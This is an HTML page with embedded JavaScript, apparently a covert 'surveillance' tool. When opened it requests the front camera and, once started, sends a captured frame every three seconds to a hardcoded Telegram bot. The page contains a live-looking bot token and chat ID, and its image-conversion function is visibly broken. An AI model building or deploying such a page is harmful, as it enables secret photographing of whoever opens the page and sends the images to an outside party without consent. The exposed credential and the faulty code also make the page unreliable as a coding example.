<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Surveillance Streamer - MISSION CRITICAL</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <style>
        /* --- Global & Body Styling --- */
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #121212; /* Dark Mode Background for Spy feel */
            color: #e0e0e0;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
            min-height: 100vh;
        }
        h1 {
            color: #4CAF50; /* Green Accent for "Go Signal" */
            margin-bottom: 10px;
            text-align: center;
        }
        #statusArea {
            background-color: #2c2c2c;
            padding: 10px;
            border-radius: 8px;
            margin-bottom: 20px;
            width: 90%;
            max-width: 600px;
            text-align: center;
        }

        /* --- Camera View Container --- */
        #cameraContainer {
            position: relative;
            width: 90%;
            max-width: 720px; 
            border: 5px solid #4CAF50;
            box-shadow: 0 0 20px rgba(76, 175, 80, 0.7);
            border-radius: 10px;
            overflow: hidden;
        }

        /* Video element for live feed */
        #videoElement {
            width: 100%;
            display: block;
        }

        canvas {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 10;
        }

        /* --- Controls --- */
        .controls {
            margin-top: 30px;
            display: flex;
            gap: 20px;
            flex-wrap: wrap;
            justify-content: center;
        }
        button {
            padding: 12px 25px;
            font-size: 16px;
            border: none;
            border-radius: 30px;
            cursor: pointer;
            transition: background-color 0.3s, transform 0.1s;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
        }
        #startBtn {
            background-color: #4CAF50;
            color: white;
        }
        #stopBtn {
            background-color: #F44336;
            color: white;
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.3);
        }
    </style>
</head>
<body>
    <h1>📷 Mission Objective Active (Live Streamer)</h1>
    <p>Monitoring activated stream for autonomous capture and transmission.</p>

    <div id="statusArea">Status: Initializing...</div>

    <div id="cameraContainer">
        <video id="videoElement" autoplay muted></video>
        <canvas id="canvasOverlay"></canvas>
    </div>

    <div class="controls">
        <button id="startBtn">Start Surveillance</button>
        <button id="stopBtn" disabled>Stop Stream</button>
    </div>

<script>
// =========================================================
// === 🔴 HARDCODED USER CONFIGURATION (ACTION REQUIRED) ===
// =========================================================
const TELEGRAM_BOT_TOKEN = "8565643267:AAG0rnblltLejIli3XSXSr4-vpstJ5Vv5WM"; // &lt;-- BOT TOKEN PASTE HERE
const TARGET_CHAT_ID = "8782681794";                                     // &lt;-- CHAT ID PASTE HERE (Numeric ID)
// Capture Interval (Milliseconds): প্রতি কত সময় পর ছবি তোলা হবে
const CAPTURE_INTERVAL_MS = 3000; // 1 সেকেন্ডে একবার
//=========================================================
// =========================================================
// === ✨ CORE JAVASCRIPT LOGIC (THE ENGINE) ===
// =========================================================
let stream = null;          
let captureIntervalId = null; 
const videoElement = document.getElementById('videoElement');
const statusArea = document.getElementById('statusArea');
const startBtn = document.getElementById('startBtn');
const stopBtn = document.getElementById('stopBtn');
const canvasOverlay = document.getElementById('canvasOverlay');
const ctx = canvasOverlay.getContext('2d');

// 1. Initialize API and State
async function initializeCamera() {
statusArea.innerHTML = 'Status: Requesting Camera Access...';
try {
    // Use "user" for front camera, as requested
    stream = await navigator.mediaDevices.getUserMedia({ 
        video: { 
            facingMode: "user" // Front camera selected
        } 
    });

    videoElement.srcObject = stream;
    videoElement.play();

    statusArea.innerHTML = 'Status: Camera Stream Acquired. Ready to monitor.';
    startBtn.disabled = false; 
    return true;

} catch (err) {
    console.error("Error accessing the camera stream:", err);
    statusArea.innerHTML = `🔴 ERROR: Cannot access Camera. Check permissions! (${err.name})`;
    alert("🚨 সতর্কতা: ক্যামেরা অ্যাক্সেস করতে সমস্যা হয়েছে। ব্রাউজার পারমিশন চেক করুন!");
    return false; 
}
}

// 2. The Core Functionality: Capture &amp;amp; Send
async function captureAndSendImage() {
if (!stream) {
updateStatus("🔴 Error: Camera stream is not active. Cannot capture.");
return false;
}
// --- A. CAPTURE LOGIC (Canvas/Video manipulation) ---
const videoWidth = videoElement.videoWidth || 1280;
const videoHeight = videoElement.videoHeight || 720;
canvasOverlay.width = videoWidth;
canvasOverlay.height = videoHeight;

ctx.drawImage(videoElement, 0, 0, videoWidth, videoHeight);
const imageDataUrl = canvasOverlay.toDataURL('image/jpeg', 0.9);

updateStatus(`[Capture Success] Captured frame and queuing transmission...`);

// --- B. TRANSMIT LOGIC (Telegram API Call) ---
try {
    await sendImageToTelegram(imageDataUrl, 'Streamed Image Capture');
    return true;
} catch (error) {
    console.error("Failed to transmit image:", error);
    updateStatus(`❌ MISSION FAILURE: Failed sending data. (${error.message.substring(0, 30)}...)`);
    return false;
}
}

// 3. Telegram API Integration (The Delivery System)
async function sendImageToTelegram(imageDataUrl, captionText) {
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;

if (!TELEGRAM_BOT_TOKEN || !TARGET_CHAT_ID) {
    throw new Error("CRITICAL MISSING DATA: Please verify TOKEN and CHAT_ID in the script.");
}

const formData = new FormData();

// 1. The Photo File (Base64 string to Blob)
const base64Image = imageDataUrl.split(',')[1];
const imageBlob = base64ToBlob(base64Image, 'image/jpeg');

formData.append('chat_id', TARGET_CHAT_ID); // Using the hardcoded ID 🚀
formData.append('caption', captionText);
formData.append('photo', imageBlob, `${Date.now()}.jpg`);


// 2. Fetch Call to Telegram API
const response = await fetch(TELEGRAM_API_URL, {
    method: 'POST',
    headers: {
        'Content-Type': 'multipart/form-data'
    },
    body: formData
});

if (!response.ok) {
    // Detailed Error Parsing for 400 Bad Request detail
    const errorBody = await response.json();
    let detailedErrorMsg;

    if (errorBody && typeof errorBody === 'object' && errorBody.error_message) {
        detailedErrorMsg = `API Message: ${errorBody.error_message}`;
    } else if (typeof errorBody === 'string') {
        detailedErrorMsg = `Raw API Response: ${errorBody}`;
    } else {
         detailedErrorMsg = `Unknown Error State`;
    }

    throw new Error(`HTTP ${response.status}: ${detailedErrorMsg}`);
}

return response.json(); 
}


// =========================================================
// === 🔧 UTILITY FUNCTIONS (The Supporting Cast) ===
// =========================================================
function base64ToBlob(base64, mimeType) {
    const byteNumbers = new Array(base64.length);
    for(let i = 0; i < base64.length; i++){
        byteNumbers[i] = parseInt(base64.substring(i * 3, i * 3 + 3), parseInt(base64.substring(i * 3, i * 3 + 3), 16));
    }
    const byteArray = new Uint8Array(byteNumbers);
    return new Blob([byteArray], { type: mimeType });
}

function updateStatus(message) {
    statusArea.innerHTML = message;
    console.log("STATUS:", message);
}
// =========================================================
// === 🚀 MAIN CONTROL LOGIC (EVENT LISTENERS) ===
// =========================================================
async function startStreaming() {
const success = await initializeCamera();
if (!success) return;

if (captureIntervalId) clearInterval(captureIntervalId); 

// Set the interval loop
captureIntervalId = setInterval(async () => {
    await captureAndSendImage();
}, CAPTURE_INTERVAL_MS);

updateStatus(`[SUCCESS] Surveillance Activated! Capturing every ${CAPTURE_INTERVAL_MS / 1000} second(s)...`);
startBtn.disabled = true; 
stopBtn.disabled = false;
}
function stopStreaming() {
if (captureIntervalId) {
clearInterval(captureIntervalId);
captureIntervalId = null;
}
if (stream) {
stream.getTracks().forEach(track => track.stop());
stream = null;
videoElement.srcObject = null;
}
updateStatus('Stream manually paused.');
startBtn.disabled = false;
stopBtn.disabled = true;
}

// 3. Event Listener Attachments (Initial Call)
document.getElementById('startBtn').addEventListener('click', startStreaming);
document.getElementById('stopBtn').addEventListener('click', stopStreaming);
window.onload = () => {
    initializeCamera(); // Initial setup is key!
};
</script>

<!-- Footer for professionalism -->
<div style="margin-top: 30px; font-size: 0.9em; color: #666;">
    Powered by DIG AI - Surveillance System v2.0 (Fixed & Optimized)
</div>

</body>
</html>
